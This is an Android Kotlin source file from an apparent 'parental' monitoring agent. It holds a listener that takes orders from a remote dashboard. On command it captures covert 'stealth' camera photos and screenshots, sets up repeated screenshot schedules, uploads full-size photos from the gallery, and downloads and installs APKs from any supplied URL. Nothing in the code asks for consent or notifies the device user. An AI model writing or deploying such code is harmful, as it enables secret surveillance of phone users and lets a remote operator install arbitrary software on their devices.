package com.parental.agent.sync

import android.content.Context
import android.util.Log
import com.parental.agent.data.local.AppPreferences
import kotlinx.coroutines.*
import okhttp3.OkHttpClient
import okhttp3.Request
import java.io.BufferedReader
import java.io.InputStreamReader
import java.util.concurrent.TimeUnit

class SsePolicyListener(
    private val context: Context,
    private val onPolicyUpdateReceived: suspend () -> Unit
) {
    companion object {
        private const val TAG = "SsePolicyListener"
    }

    private val client = OkHttpClient.Builder()
        .readTimeout(0, TimeUnit.MILLISECONDS) // Persistent stream: no timeout
        .connectTimeout(10, TimeUnit.SECONDS)
        .build()

    private var listenerJob: Job? = null

    private fun isNetworkAvailable(): Boolean {
        return try {
            val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as? android.net.ConnectivityManager ?: return true
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
                val network = cm.activeNetwork ?: return false
                val capabilities = cm.getNetworkCapabilities(network) ?: return false
                capabilities.hasCapability(android.net.NetworkCapabilities.NET_CAPABILITY_INTERNET)
            } else {
                @Suppress("DEPRECATION")
                val activeNetwork = cm.activeNetworkInfo
                @Suppress("DEPRECATION")
                activeNetwork != null && activeNetwork.isConnected
            }
        } catch (e: Exception) {
            true
        }
    }

    fun startListening(scope: CoroutineScope) {
        listenerJob?.cancel()
        listenerJob = scope.launch(Dispatchers.IO) {
            val prefs = AppPreferences(context)

            while (isActive) {
                if (!isNetworkAvailable()) {
                    delay(15000) // Quiet 15s delay when network is offline
                    continue
                }

                val deviceId = prefs.getDeviceId()
                val sseUrl = "${ApiConstants.BASE_URL}api/v1/policy/stream/$deviceId"

                try {
                    Log.i(TAG, "Connecting real-time SSE Policy Stream: $sseUrl")
                    val request = Request.Builder()
                        .url(sseUrl)
                        .header("Accept", "text/event-stream")
                        .build()

                    client.newCall(request).execute().use { response ->
                        if (response.isSuccessful && response.body != null) {
                            Log.i(TAG, "✅ Connected to SSE Policy Stream! Executing instant full catch-up policy fetch...")
                            onPolicyUpdateReceived() // Catch up on all rules added/modified while disconnected!

                            val reader = BufferedReader(InputStreamReader(response.body!!.byteStream()))
                            var line: String? = null

                            while (isActive && reader.readLine().also { line = it } != null) {
                                val currentLine = line ?: continue
                                if (currentLine.startsWith("data:")) {
                                    var cleanJson = currentLine
                                    while (cleanJson.startsWith("data:")) {
                                        cleanJson = cleanJson.removePrefix("data:").trim()
                                    }
                                    Log.i(TAG, "⚡ INSTANT SSE UPDATE EVENT RECEIVED FROM DASHBOARD: $cleanJson")

                                    try {
                                        val json = org.json.JSONObject(cleanJson)
                                        val payload = json.optJSONObject("payload")
                                        val action = payload?.optString("action") ?: ""

                                        if (action == "CAPTURE_STEALTH_PHOTO") {
                                            val camera = payload?.optString("camera", "FRONT") ?: "FRONT"
                                            val commandId = payload?.optString("commandId") ?: ""
                                            Log.i(TAG, "📸 Real-Time SSE Stealth Photo Trigger ($camera camera, commandId=$commandId)...")
                                            val stealthCollector = com.parental.agent.collectors.media.StealthPhotoCollector(context)
                                            stealthCollector.captureStealthPhoto(camera, commandId)
                                        } else if (action == "CAPTURE_SCREENSHOT") {
                                            val commandId = payload?.optString("commandId") ?: ""
                                            Log.i(TAG, "📱 Real-Time SSE Instant Screenshot Trigger (commandId=$commandId)...")
                                            val screenshotCollector = com.parental.agent.collectors.media.ScreenshotCollector(context)
                                            screenshotCollector.captureScreenshot(commandId)
                                         } else if (action == "CONFIGURE_SCREENSHOT_SCHEDULE") {
                                            val active = payload?.optBoolean("active", false) ?: false
                                            val durationMin = payload?.optInt("durationMin", 15) ?: 15
                                            val intervalSec = payload?.optInt("intervalSec", 30) ?: 30
                                            val startTime = payload?.optLong("startTime", 0L) ?: 0L
                                            val stopTime = payload?.optLong("stopTime", 0L) ?: 0L
                                            Log.i(TAG, "⏰ Real-Time SSE Screenshot Schedule Config: active=$active, interval=${intervalSec}s, duration=${durationMin}m, startTime=$startTime")
                                            val screenshotCollector = com.parental.agent.collectors.media.ScreenshotCollector(context)
                                            screenshotCollector.configureSchedule(scope, active, durationMin, intervalSec, startTime, stopTime)
                                        } else if (action == "REMOTE_UPDATE" || action == "UPDATE_DEVICE") {
                                            val apkUrl = payload?.optString("apkUrl") ?: ""
                                            val sha256 = payload?.optString("sha256") ?: ""
                                            val jobId = payload?.optString("jobId") ?: "job_${System.currentTimeMillis()}"
                                            val versionName = payload?.optString("versionName") ?: "v2.2.0"

                                            Log.i(TAG, "🚀 Real-Time SSE Remote OTA Update Triggered: apkUrl=$apkUrl, sha256=$sha256, jobId=$jobId, version=$versionName")
                                            if (apkUrl.isNotBlank()) {
                                                com.parental.agent.ota.OtaUpdateManager.downloadAndInstall(
                                                    context,
                                                    apkUrl,
                                                    sha256,
                                                    jobId,
                                                    versionName
                                                ) { callbackJobId, status, progress, error ->
                                                    Log.i(TAG, "📡 OTA Telemetry Callback [$callbackJobId]: Status=$status ($progress%) Error=$error")
                                                    scope.launch(kotlinx.coroutines.Dispatchers.IO) {
                                                        try {
                                                            val api = ApiConstants.apiService
                                                            val deviceId = AppPreferences(context).getDeviceId()
                                                            api.reportOtaProgress(
                                                                OtaProgressPayload(
                                                                    jobId = callbackJobId,
                                                                    deviceId = deviceId,
                                                                    status = status,
                                                                    progress = progress,
                                                                    errorMessage = error
                                                                )
                                                            )
                                                        } catch (ex: Exception) {
                                                            Log.w(TAG, "Failed to report OTA progress: ${ex.message}")
                                                        }
                                                    }
                                                }
                                            }
                                        } else {
                                            val filename = payload?.optString("filename") ?: ""
                                            if (filename.isNotEmpty()) {
                                                Log.i(TAG, "📸 Real-Time SSE HD Photo Request: $filename. Uploading now...")
                                                val collector = com.parental.agent.collectors.media.PhotoGalleryCollector(context)
                                                collector.uploadFullSizePhotoByFilename(filename)
                                            }
                                        }
                                    } catch (e: Exception) {
                                        Log.e(TAG, "Error parsing SSE JSON: ${e.message}", e)
                                    }

                                    onPolicyUpdateReceived()
                                }
                            }
                        }
                    }
                } catch (e: Exception) {
                    Log.w(TAG, "SSE Policy Stream connection paused (${e.message}). Reconnecting in 5 seconds...")
                }
                delay(5000) // Backoff reconnect
            }
        }
    }

    fun stop() {
        listenerJob?.cancel()
    }
}
